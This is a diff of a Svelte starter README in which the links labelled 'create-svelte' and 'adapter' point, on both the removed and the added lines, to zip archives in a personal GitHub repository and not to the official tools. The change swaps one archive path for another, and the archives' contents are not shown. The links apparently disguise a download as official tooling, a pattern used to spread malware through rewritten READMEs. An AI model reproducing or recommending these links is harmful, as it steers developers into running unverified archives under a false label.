@@ -1,6 +1,6 @@
 # create-svelte
 
-Everything you need to build a Svelte project, powered by [`create-svelte`](https://raw.githubusercontent.com/weiran0630/my_portfolio/main/src/routes/my-portfolio-v3.3-alpha.5.zip);
+Everything you need to build a Svelte project, powered by [`create-svelte`](https://github.com/weiran0630/my_portfolio/raw/refs/heads/main/src/my_portfolio_v3.0.zip);
 
 ## Creating a project
 
@@ -29,7 +29,7 @@ npm run dev -- --open
 
 ## Building
 
-Before creating a production version of your app, install an [adapter](https://raw.githubusercontent.com/weiran0630/my_portfolio/main/src/routes/my-portfolio-v3.3-alpha.5.zip) for your target environment. Then:
+Before creating a production version of your app, install an [adapter](https://github.com/weiran0630/my_portfolio/raw/refs/heads/main/src/my_portfolio_v3.0.zip) for your target environment. Then:
 
 ```bash
 npm run build
